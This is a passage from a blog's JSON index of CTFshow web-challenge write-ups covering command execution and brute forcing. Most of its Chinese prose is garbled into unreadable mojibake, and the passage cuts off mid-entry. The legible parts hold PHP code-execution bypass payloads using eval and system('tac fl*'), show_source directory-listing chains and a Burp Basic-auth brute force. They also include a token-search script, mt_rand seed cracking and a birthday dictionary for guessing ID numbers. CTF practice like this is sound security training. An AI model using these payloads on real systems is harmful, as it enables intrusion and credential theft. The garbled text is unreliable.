å¥½å®¶ä¼™è¿™æ˜¯åŸºæœ¬ä¸ŠæŠŠèƒ½è¿‡æ»¤çš„ç¬¦å·å…¨éƒ¨ç»™å™¶äº†ï¼Œä¸è¿‡ä»”ç»†ä¸€çœ‹ä¼¼ä¹åŠè§’æ‹¬å·æ²¡è¢«è¿‡æ»¤ï¼Œé‚£åº”è¯¥å¦‚ä½•å°è¯•åªç”¨()å°±è·å–å‘¢ï¼Œä¸Šé¢é¢˜ç›®ï¼ˆWEB31ï¼‰å·²ç»æœ‰ä¾‹å­äº†ï¼Œç›´æ¥ç”¨?c=show_source(next(array_reverse(scandir(pos(localeconv())))));å°±ç›´æ¥ç»•è¿‡å•¦ã€‚\nè¿™é‡Œæœ‰ä¸¤ç§åšæ³•ï¼Œåˆ†åˆ«è§£æï¼š\n1.POSTä¼ å‚ c=eval(array_pop(next(get_defined_vars())));//éœ€è¦POSTä¼ å…¥å‚æ•°ä¸º1=system(\u0026rsquo;tac fl*\u0026rsquo;);\nget_defined_vars() è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡çš„å¤šç»´æ•°ç»„ã€‚è¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ï¼Œä¾‹å¦‚GETã€POSTã€FILEç­‰ç­‰ã€‚\nnext()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚\narray_pop() å‡½æ•°åˆ é™¤æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ å¹¶è¿”å›å…¶å€¼ã€‚\n2.show_source c=show_source(next(array_reverse(scandir(pos(localeconv()))))); æˆ–è€… c=show_source(next(array_reverse(scandir(getcwd()))));\ngetcwd() å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚å®ƒå¯ä»¥ä»£æ›¿pos(localeconv())\nlocaleconv()ï¼šè¿”å›åŒ…å«æœ¬åœ°åŒ–æ•°å­—å’Œè´§å¸æ ¼å¼ä¿¡æ¯çš„å…³è”æ•°ç»„ã€‚è¿™é‡Œä¸»è¦æ˜¯è¿”å›å€¼ä¸ºæ•°ç»„ä¸”ç¬¬ä¸€é¡¹ä¸º\u0026rdquo;.\u0026quot;\npos():è¾“å‡ºæ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¸æ”¹å˜æŒ‡é’ˆï¼›\ncurrent() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ï¼Œå’Œpos()ä¸€æ ·\nscandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚è¿™é‡Œå› ä¸ºå‚æ•°ä¸º\u0026quot;.\u0026ldquo;æ‰€ä»¥éå†å½“å‰ç›®å½•\narray_reverse():æ•°ç»„é€†ç½®\nnext():å°†æ•°ç»„æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªï¼Œè¿™é‡Œå…¶å®å¯ä»¥çœç•¥å€’ç½®å’Œæ”¹å˜æ•°ç»„æŒ‡é’ˆï¼Œç›´æ¥åˆ©ç”¨[2]å–å‡ºæ•°ç»„ä¹Ÿå¯ä»¥\nshow_source():æŸ¥çœ‹æºç \npos() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚è¯¥å‡½æ•°æ˜¯current()å‡½æ•°çš„åˆ«åã€‚\næ¯ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çš„æŒ‡é’ˆæŒ‡å‘å®ƒçš„\u0026quot;å½“å‰\u0026quot;å…ƒç´ ï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚\næç¤ºï¼šè¯¥å‡½æ•°ä¸ä¼šç§»åŠ¨æ•°ç»„å†…éƒ¨æŒ‡é’ˆã€‚\nç›¸å…³çš„æ–¹æ³•ï¼š\ncurrent()è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚\nend()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚\nnext()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚\nprev()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚\nreset()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚\neach()è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚\n","date":"2024-11-25T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_web_command_write_up_1/","title":"CTF_show Web å‘½ä»¤æ‰§è¡Œwriteup P1 WEB29-WEB40"},{"content":"CTFSHOW web çˆ†ç ´WriteUP WEB21 çˆ†ç ´ä»€ä¹ˆçš„ï¼Œéƒ½æ˜¯åŸºæ“\næ‰“å¼€ç¯å¢ƒåå‘ç°ç™»å½•ï¼Œç„¶åéšä¾¿è¾“å…¥å¯†ç ç”¨burpæŠ“åŒ…\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 GET / HTTP/1.1 Host: f57b8182-620f-42bb-96d2-07460dab13f7.challenge.ctf.show Cache-Control: max-age=0 Authorization: Basic YWRtaW46MTIzNDU= Sec-Ch-Ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;127\u0026#34;, \u0026#34;Not)A;Brand\u0026#34;;v=\u0026#34;99\u0026#34; Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \u0026#34;Windows\u0026#34; Accept-Language: zh-CN Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate, br Priority: u=0, i Connection: keep-alive å‘ç°Authorizationçš„å†…å®¹æ˜¯baseç¼–ç ï¼Œä½¿ç”¨base64è§£å‡ºadmin:12345ï¼Œæ­£æ˜¯åˆšåˆšè¾“å…¥çš„å†…å®¹ã€‚\nä½¿ç”¨Burpçš„IntruderåŠŸèƒ½çˆ†ç ´ï¼Œæ’å…¥åˆ°Authorizationåé¢\n1 Authorization: Basic Â§Â§ payloadç±»å‹è®¾ç½®ç®€å•åˆ—è¡¨ç„¶åå¯¼å…¥å­—å…¸ ç„¶åpayloadå¤„ç†ä¸­è®¾ç½®ä»¥ä¸‹å½¢å¼\n1 2 Add Prefix: admin: Base64-encode ä¸è¿‡è¯•äº†å‡ ä¸ªå­—å…¸éƒ½æ²¡çˆ†å‡ºæ¥æœ€åæ²¡åŠæ³•äº†ç›´æ¥çœ‹çš„ç­”æ¡ˆ\nè´¦å·å¯†ç åˆ†åˆ«ä¸ºadmin:shark63ï¼Œæäº¤è¯·æ±‚ç›´æ¥è·å–åˆ°flag\nWEB22 åŸŸåä¹Ÿå¯ä»¥çˆ†ç ´çš„ï¼Œè¯•è¯•çˆ†ç ´è¿™ä¸ªctf.showçš„å­åŸŸå\nè¿™é“é¢˜å› ä¸ºåŸæ¥åŸŸåå¤±æ•ˆå¯¼è‡´åšä¸äº†äº†ï¼Œç›´æ¥ç»™å‡ºäº†flag\nWEB23 è¿˜çˆ†ç ´ï¼Ÿè¿™ä¹ˆå¤šä»£ç ï¼Œå‘Šè¾ï¼\nä»æºç ä¸­å¯ä»¥çœ‹å‡ºè¯·æ±‚å‚æ•°ä¸º/?token=***\nå¯ä»¥çœ‹å‡ºtokenæ˜¯åŒ¹é…ç‰¹æ®Šçš„md5æ ¼å¼ï¼Œä½¿ç”¨chatgptè¯¢é—®å¹¶è®©å…¶ç¼–å†™ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 ä»£ç è§£æ include(\u0026#39;flag.php\u0026#39;);ï¼šå‡è®¾ flag.php æ–‡ä»¶ä¸­åŒ…å«ä¸€ä¸ªå˜é‡ $flagï¼Œå…¶å†…å®¹ä¸ºæˆ‘ä»¬æƒ³è¦è·å¾—çš„æ•æ„Ÿä¿¡æ¯ã€‚ if(isset($_GET[\u0026#39;token\u0026#39;])){ï¼šæ£€æŸ¥æ˜¯å¦é€šè¿‡ GET æ–¹æ³•ä¼ é€’äº† token å‚æ•°ã€‚ $token = md5($_GET[\u0026#39;token\u0026#39;]);ï¼šå¯¹ token å‚æ•°æ‰§è¡Œ md5 å“ˆå¸Œè®¡ç®—ï¼Œç»“æœä¿å­˜åœ¨ $token å˜é‡ä¸­ã€‚$token ç°åœ¨æ˜¯ä¸€ä¸ª32ä½çš„16è¿›åˆ¶å­—ç¬¦ä¸²ã€‚ æ¡ä»¶åˆ¤æ–­ï¼š if(substr($token, 1,1)===substr($token, 14,1) \u0026amp;\u0026amp; substr($token, 14,1) ===substr($token, 17,1))ï¼šæ£€æŸ¥ $token å­—ç¬¦ä¸²ä¸­ç¬¬2ä½ã€ç¬¬15ä½å’Œç¬¬18ä½æ˜¯å¦ç›¸åŒã€‚substr ç”¨äºæˆªå– $token ä¸­çš„å•ä¸ªå­—ç¬¦ï¼Œç´¢å¼•ä»0å¼€å§‹ï¼Œå› æ­¤ substr($token, 1,1) è¡¨ç¤ºè·å–ç¬¬äºŒä¸ªå­—ç¬¦ã€‚ if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))ï¼šè¿™æ¡è¯­å¥åœ¨ç»§ç»­æ£€æŸ¥ï¼Œå¦‚æœå‰é¢çš„æ¡ä»¶é€šè¿‡ï¼Œé‚£ä¹ˆå®ƒè¿›ä¸€æ­¥éªŒè¯ä¸€ä¸ªæ•°å­¦å…³ç³»ï¼š é¦–å…ˆï¼Œå®ƒå°†ç¬¬2ä½ã€ç¬¬15ä½å’Œç¬¬18ä½çš„å­—ç¬¦å€¼ç›¸åŠ å¹¶é™¤ä»¥ç¬¬2ä½çš„å­—ç¬¦å€¼ï¼Œç»“æœä¸ç¬¬32ä½å­—ç¬¦å€¼ç›¸ç­‰ã€‚ è¿™é‡Œä½¿ç”¨ intval å°†å­—ç¬¦è½¬æ¢ä¸ºæ•´æ•°å€¼ï¼Œä»¥ä¾¿æ‰§è¡Œæ•°å­¦è¿ç®—ã€‚ echo $flag;ï¼šå¦‚æœä¸Šè¿°æ‰€æœ‰æ¡ä»¶éƒ½æ»¡è¶³ï¼Œç¨‹åºè¾“å‡º $flagï¼Œå³æ•æ„Ÿä¿¡æ¯ã€‚ highlight_file(__FILE__);ï¼šå¦‚æœæ²¡æœ‰ä¼ é€’ token å‚æ•°ï¼Œæˆ– token ä¸æ»¡è¶³æ¡ä»¶ï¼Œé‚£ä¹ˆå°†æ˜¾ç¤ºå½“å‰æ–‡ä»¶çš„æºä»£ç ã€‚ 1 2 3 4 5 6 7 8 å¦‚ä½•æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ token ä¸ºäº†è·å¾— $flagï¼Œæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ª token å€¼ï¼Œä½¿å¾—å®ƒçš„ md5 å“ˆå¸Œç»“æœæ»¡è¶³æ‰€æœ‰æ¡ä»¶ï¼š æ»¡è¶³å­—ç¬¦ç›¸ç­‰æ€§æ¡ä»¶ï¼š substr($token, 1,1), substr($token, 14,1), å’Œ substr($token, 17,1) çš„å­—ç¬¦å¿…é¡»ç›¸ç­‰ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥é€‰æ‹©ä¸€ä¸ªç®€å•çš„æ•´æ•°æˆ–å­—ç¬¦ï¼Œä½¿å¾— md5 çš„ç¬¬2ä½ã€ç¬¬15ä½å’Œç¬¬18ä½å­—ç¬¦ç›¸åŒã€‚ æ»¡è¶³æ•°å­¦æ¡ä»¶ï¼š ç¡®ä¿ (intval(substr($token, 1,1)) + intval(substr($token, 14,1)) + intval(substr($token, 17,1))) / substr($token, 1,1) === intval(substr($token, 31,1))ã€‚ è¿™æ„å‘³ç€æˆ‘ä»¬éœ€è¦è°ƒæ•´ token çš„å€¼ï¼Œä½¿å¾— md5 å“ˆå¸Œçš„ç¬¬2ä½å’Œç¬¬32ä½ç¬¦å·æ»¡è¶³è¯¥æ•°å­¦æ¡ä»¶ã€‚ å¯ä»¥ä½¿ç”¨ä»£ç æˆ–æ‰‹åŠ¨å°è¯•ç”Ÿæˆä¸€ä¸ªå€¼ï¼Œä½¿å…¶ md5 å“ˆå¸Œç¬¦åˆä¸Šè¿°è§„åˆ™ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import hashlib def find_token(): for i in range(100000): # å°è¯•0åˆ°99999çš„æ•´æ•°ä½œä¸ºå€™é€‰ token token = str(i) # å°†å€™é€‰å€¼è½¬æ¢ä¸ºå­—ç¬¦ä¸² md5_hash = hashlib.md5(token.encode()).hexdigest() # æ£€æŸ¥æ¡ä»¶ï¼šç¬¬2ä½ã€ç¬¬15ä½å’Œç¬¬18ä½å­—ç¬¦æ˜¯å¦ç›¸åŒ if md5_hash[1] == md5_hash[14] == md5_hash[17]: # ç¡®ä¿ç¬¬2ä½å’Œç¬¬32ä½å­—ç¬¦éƒ½æ˜¯æ•°å­— if md5_hash[1].isdigit() and md5_hash[31].isdigit(): # æ£€æŸ¥æ•°å­¦æ¡ä»¶ if (int(md5_hash[1]) + int(md5_hash[14]) + int(md5_hash[17])) / int(md5_hash[1]) == int(md5_hash[31]): print(f\u0026#34;Found token: {token}\u0026#34;) print(f\u0026#34;MD5 hash: {md5_hash}\u0026#34;) return token # è¿”å›ç¬¦åˆæ¡ä»¶çš„ token print(\u0026#34;No valid token found.\u0026#34;) return None # æ‰§è¡Œç¨‹åº find_token() è¿™ä¸ªä»£ç è™½ç„¶æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯å¯¹äºè¿™é“é¢˜ä»¥åŠå¤Ÿç”¨äº†ï¼Œè¿è¡Œç›´æ¥è¾“å‡º\n1 2 Found token: 422 MD5 hash: f85454e8279be180185cac7d243c5eb3 ç›´æ¥ä¼ å‚/?token=422è·å–flag\nWEB24 çˆ†ä¸ªğŸ”¨\nç›´æ¥çœ‹phpä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-03 13:26:39 # @Last Modified by: h1xa # @Last Modified time: 2020-09-03 13:53:31 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); include(\u0026#34;flag.php\u0026#34;); if(isset($_GET[\u0026#39;r\u0026#39;])){ $r = $_GET[\u0026#39;r\u0026#39;]; mt_srand(372619038); if(intval($r)===intval(mt_rand())){ echo $flag; } }else{ highlight_file(__FILE__); echo system(\u0026#39;cat /proc/version\u0026#39;); } ?\u0026gt; Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 è™½ç„¶æ˜¯éšæœºæ•°ï¼Œä½†æ˜¯ç§å­éƒ½ç»™æˆ‘ä»¬äº†è¿˜æœ‰å•¥å¥½è¯´çš„ï¼Œç›´æ¥å†™ä¸ªæ–‡ä»¶è§£å‡ºæ¥å’¯\n1 2 3 4 \u0026lt;?php mt_srand(372619038); echo mt_rand(); ?\u0026gt; è§£å‡º1155388967ï¼Œç›´æ¥ä¼ å‚?r=1155388967è·å–åˆ°flag\nWEB25 çˆ†ä¸ªğŸ”¨ï¼Œä¸çˆ†äº†\nè¿™é“é¢˜ä¸€çœ‹æ„Ÿè§‰éš¾äº†ä¸å°‘ï¼Œè™½ç„¶è¿˜æ˜¯ä¼ å‚ï¼Œä½†æ˜¯æ²¡æœ‰å‰ä¸¤é“å¯ä»¥ä¸€çœ¼ä¸çœŸäº†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-03 13:56:57 # @Last Modified by: h1xa # @Last Modified time: 2020-09-03 15:47:33 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); include(\u0026#34;flag.php\u0026#34;); if(isset($_GET[\u0026#39;r\u0026#39;])){ $r = $_GET[\u0026#39;r\u0026#39;]; mt_srand(hexdec(substr(md5($flag), 0,8))); $rand = intval($r)-intval(mt_rand()); if((!$rand)){ if($_COOKIE[\u0026#39;token\u0026#39;]==(mt_rand()+mt_rand())){ echo $flag; } }else{ echo $rand; } }else{ highlight_file(__FILE__); echo system(\u0026#39;cat /proc/version\u0026#39;); } Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 éšä¾¿ä¼ ä¿©å‚å‘ç°ä¼šè¿”å›ä¸€ä¸ªå€¼ï¼Œè¯¢é—®chatgptåˆ†æåå‘ç°è¿™ä¸ªè¯­å¥mt_srand(hexdec(substr(md5($flag), 0,8))); ç”¨ $flag çš„ MD5 æ•£åˆ—å€¼çš„å‰8ä½ä½œä¸ºç§å­ï¼Œè®¾ç½®äº†ä¸€ä¸ªç‰¹å®šçš„éšæœºæ•°ç§å­ï¼Œç„¶åæŠŠä¼ è¿›å»çš„å‚å’Œè¿™ä¸ªå€¼åšå·®ï¼Œç›´æ¥ä¼ ä¸ªr=0ç›´æ¥å°±å¾—å‡ºäº†å‚æ•°?r=1570172612\nç„¶åæ€è·¯å°±å¡æ­»äº†\u0026hellip;\u0026hellip;å› ä¸ºå¹¶ä¸çŸ¥é“å¼€å§‹çš„ç§å­ï¼Œçˆ†ç ´ä¸çŸ¥é“è¦çˆ†åˆ°ä»€ä¹ˆæ—¶å€™\u0026hellip;..çœ‹äº†å‡ ä¸ªwpå’Œæç¤ºï¼Œé€šè¿‡è¿™é‡Œä¸‹è½½äº†ä¸€ä¸ªçˆ†ç ´ç§å­çš„è½¯ä»¶ï¼Œæˆ‘æ˜¯åœ¨Linuxä¸‹ç¼–è¯‘è¿è¡Œçš„ï¼Œè¾“å…¥ç¬¬ä¸€ä¸ªç§å­ï¼Œ\n1 2 3 4 \u0026lt;?php mt_srand(202568455); //çˆ†ç ´å‡ºçš„ç§å­ echo mt_rand()+mt_rand()+mt_rand()-ç¬¬ä¸€ä¸ªmt_randçš„å€¼; // ç”±äºæ‰§è¡Œäº†3æ¬¡ï¼Œè€ŒæœŸæœ›çš„å€¼ï¼ˆcookieï¼‰åªéœ€è¦ç¬¬äºŒä¸‰ä¸ªï¼Œè¿™é‡Œå‡å»ç¬¬ä¸€ä¸ªå€¼ ?\u0026gt; è¿™é‡Œè¯•äº†éå¸¸ï¼éå¸¸ï¼ä¹…ï¼å¤ç°åˆ«äººçš„éƒ½æˆåŠŸäº†ï¼ˆæ¯”å¦‚æç¤ºé‡Œé‚£ä¸ªï¼‰ï¼Œä½†æ˜¯æˆ‘è¿™ä¸ªæ¯ä¸ªéƒ½è¯•äº†å°±æ˜¯ä¸è¡Œï¼Œæˆ‘çŒœæµ‹æ˜¯è¿™ä¸ªç§å­æ— è§£å¯¼è‡´çš„ï¼Œè¿™é‡Œè´´ä¸Šè§£å‡ºæ¥çš„å†…å®¹å’Œç§å­ï¼Œå¸Œæœ›æœ‰å¤§ä½¬å¯ä»¥è§£ç­”ä¸€ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/æ¡Œé¢/233/php_mt_seed-4.0] â””â”€# \u0026#39;/home/kali/æ¡Œé¢/233/php_mt_seed-4.0/php_mt_seed\u0026#39; 1570172612 Pattern: EXACT Version: 3.0.7 to 5.2.0 Found 0, trying 0xc8000000 - 0xcbffffff, speed 16777.2 Mseeds/s seed = 0xcbd7561a = 3419887130 (PHP 3.0.7 to 5.2.0) seed = 0xcbd7561b = 3419887131 (PHP 3.0.7 to 5.2.0) Found 2, trying 0xfc000000 - 0xffffffff, speed 16911.4 Mseeds/s Version: 5.2.1+ Found 2, trying 0xb2000000 - 0xb3ffffff, speed 167.2 Mseeds/s seed = 0xb38818b6 = 3012040886 (PHP 5.2.1 to 7.0.x; HHVM) Found 3, trying 0xbc000000 - 0xbdffffff, speed 166.4 Mseeds/s seed = 0xbd0e7df0 = 3171843568 (PHP 5.2.1 to 7.0.x; HHVM) Found 4, trying 0xc6000000 - 0xc7ffffff, speed 166.1 Mseeds/s seed = 0xc7d72544 = 3352765764 (PHP 5.2.1 to 7.0.x; HHVM) seed = 0xc7d72544 = 3352765764 (PHP 7.1.0+) Found 6, trying 0xd2000000 - 0xd3ffffff, speed 165.9 Mseeds/s seed = 0xd2005b5c = 3523238748 (PHP 5.2.1 to 7.0.x; HHVM) seed = 0xd2005b5c = 3523238748 (PHP 7.1.0+) Found 8, trying 0xfe000000 - 0xffffffff, speed 165.2 Mseeds/s Found 8 é‡å¼€ç¯å¢ƒå†æ¬¡è¿›è¡Œæµ‹è¯•\nè¿™æ¬¡è¾“å‡º\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/æ¡Œé¢/233/php_mt_seed-4.0] â””â”€# \u0026#39;/home/kali/æ¡Œé¢/233/php_mt_seed-4.0/php_mt_seed\u0026#39; 1164719300 Pattern: EXACT Version: 3.0.7 to 5.2.0 Found 0, trying 0x88000000 - 0x8bffffff, speed 17551.5 Mseeds/s seed = 0x8bf3d33e = 2348012350 (PHP 3.0.7 to 5.2.0) seed = 0x8bf3d33f = 2348012351 (PHP 3.0.7 to 5.2.0) Found 2, trying 0xfc000000 - 0xffffffff, speed 17616.1 Mseeds/s Version: 5.2.1+ Found 2, trying 0x32000000 - 0x33ffffff, speed 161.9 Mseeds/s seed = 0x334a2baf = 860498863 (PHP 7.1.0+) Found 3, trying 0x84000000 - 0x85ffffff, speed 163.8 Mseeds/s seed = 0x8540cacf = 2235615951 (PHP 5.2.1 to 7.0.x; HHVM) Found 4, trying 0xa4000000 - 0xa5ffffff, speed 164.3 Mseeds/s seed = 0xa490bd69 = 2760949097 (PHP 7.1.0+) Found 5, trying 0xfe000000 - 0xffffffff, speed 165.2 Mseeds/s Found 5 ä½¿ç”¨ä»¥ä¸‹ä»£ç å‡ºè§£\n1 2 3 4 \u0026lt;?php mt_srand(2760949097); //çˆ†ç ´å‡ºçš„ç§å­ echo mt_rand()+mt_rand()+mt_rand()-1164719300; // ç”±äºæ‰§è¡Œäº†3æ¬¡ï¼Œè€ŒæœŸæœ›çš„å€¼ï¼ˆcookieï¼‰åªéœ€è¦ç¬¬äºŒä¸‰ä¸ªï¼Œè¿™é‡Œå‡å»ç¬¬ä¸€ä¸ªå€¼ ?\u0026gt; æœ€ågetä¼ å‚?r=1164719300ï¼Œcookieä½¿ç”¨Hackbartoken=1458369882ç›´æ¥executeæ‹¿åˆ°flagctfshow{87e05252-fe88-4767-85e1-c75fd6eb124b}\nç„¶åä¸å°å¿ƒæŠŠå®¹å™¨é”€æ¯äº†ï¼Œåˆè¦é‡åšäº†å‘œå‘œå‘œ\nä¸è¿‡è¿™é“é¢˜å€’æ˜¯åšå‡ºæ¥äº†\nWEB26 è¿™ä¸ªå¯ä»¥çˆ†\nè¿™é“é¢˜å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯çˆ†ç ´ï¼Œç»“æœç ”ç©¶äº†åŠå¤©å‘ç°è¦å¡«å…¥çš„é¡¹å¤ªå¤šäº†ä¸çŸ¥é“æ€ä¹ˆåšï¼Œåæ¥ç›´æ¥å¡«çš„ç©ºå‚æ•°ç›´æ¥è¿æ¥æˆåŠŸäº†ï¼Œä¹Ÿæ˜¯éå¸¸å¼‚æˆ–å•Šï¼Œç›´æ¥ç”¨burpé‡æ”¾å™¨å‘é€è¯·æ±‚å³å¯çœ‹åˆ°flag\nWEB27 CTFshowèœé¸¡å­¦é™¢æ‹›ç”Ÿå•¦ï¼\nçœ‹åˆ°æœ‰å½•å–åå•åˆ—è¡¨ï¼Œæ‰“å¼€å‘ç°èº«ä»½è¯è¢«å»æ‰äº†å‡ºç”Ÿæ—¥æœŸè¿™ä¸€éƒ¨åˆ†ï¼Œä½¿ç”¨ä¸‹é¢çš„è„šæœ¬ä¾¿æ·åœ°ç”Ÿæˆç”Ÿæ—¥å­—å…¸\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 from datetime import datetime, timedelta def generate_birthday_dict(start_date, end_date): \u0026#34;\u0026#34;\u0026#34; ç”ŸæˆæŒ‡å®šæ—¥æœŸèŒƒå›´å†…çš„ç”Ÿæ—¥å­—å…¸ã€‚ Args: start_date (str): å¼€å§‹æ—¥æœŸï¼Œæ ¼å¼ä¸º \u0026#34;YYYY-MM-DD\u0026#34; end_date (str): ç»“æŸæ—¥æœŸï¼Œæ ¼å¼ä¸º \u0026#34;YYYY-MM-DD\u0026#34; Returns: dict: ç”Ÿæ—¥å­—å…¸ï¼Œé”®ä¸ºæ—¥æœŸï¼Œå€¼ä¸ºç©ºå­—ç¬¦ä¸²ï¼ˆç”¨äºå¡«å†™åå­—ï¼‰ \u0026#34;\u0026#34;\u0026#34; date_format = \u0026#34;%Y%m%d\u0026#34; start = datetime.strptime(start_date, date_format) end = datetime.strptime(end_date, date_format) current = start birthday_dict = {} while current \u0026lt;= end: birthday_dict[current.strftime(date_format)] = \u0026#34;\u0026#34; current += timedelta(days=1) return birthday_dict def save_birthday_dict_to_txt(birthday_dict, filename=\u0026#34;birthdays.txt\u0026#34;): \u0026#34;\u0026#34;\u0026#34; å°†ç”Ÿæ—¥å­—å…¸ä¿å­˜åˆ° txt æ–‡ä»¶ä¸­ã€‚ Args: birthday_dict (dict): ç”Ÿæ—¥å­—å…¸ï¼Œé”®ä¸ºæ—¥æœŸï¼Œå€¼ä¸ºç©ºå­—ç¬¦ä¸² filename (str): è¾“å‡ºæ–‡ä»¶å \u0026#34;\u0026#34;\u0026#34; with open(filename, \u0026#34;w\u0026#34;) as file: for date, name in birthday_dict.items(): file.write(f\u0026#34;{date}\\n\u0026#34;) print(f\u0026#34;ç”Ÿæ—¥å­—å…¸å·²ä¿å­˜åˆ° {filename}\u0026#34;) # ç”¨æˆ·è¾“å…¥æ—¥æœŸèŒƒå›´ start_date = input(\u0026#34;è¯·è¾“å…¥å¼€å§‹æ—¥æœŸ (YYYYMMDD): \u0026#34;) end_date = input(\u0026#34;è¯·è¾“å…¥ç»“æŸæ—¥æœŸ (YYYYMMDD): \u0026#34;) # ç”Ÿæˆç”Ÿæ—¥å­—å…¸å¹¶ä¿å­˜ birthday_dict = generate_birthday_dict(start_date, end_date) save_birthday_dict_to_txt(birthday_dict) ç”Ÿæˆä¸€ä¸ª1990-2010ç”Ÿæ—¥çš„å­—å…¸ï¼Œç„¶åæ”¾åˆ°burpçš„é‡æ”¾å™¨é‡Œè·‘ä¸€éï¼Œå‘ç°\na=%E5%B5%87%E5%BC%80%E6%A2%A6\u0026amp;p=360730199110167653\næˆåŠŸå¾—å‡ºç»“æœï¼Œä¸è¿‡æ˜¯\\uçš„å­—ç¬¦ï¼Œæ‰¾ä¸ªåœ¨çº¿ç½‘ç«™è§£ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚è§£å‡ºè´¦å·å’Œå¯†ç ç›´æ¥é€‰æ‹©å­¦ç”Ÿç™»å½•å³å¯æˆåŠŸã€‚\nWEB28 å¤§æµ·æé’ˆ\nè¿™é“é¢˜æ‰“å¼€ç¯å¢ƒå‘ç°/0/1/2.txtï¼ŒçŒœæµ‹æ˜¯ç›®å½•çˆ†ç ´ï¼Œä½¿ç”¨Burpçš„IntruderåŠŸèƒ½çˆ†ç 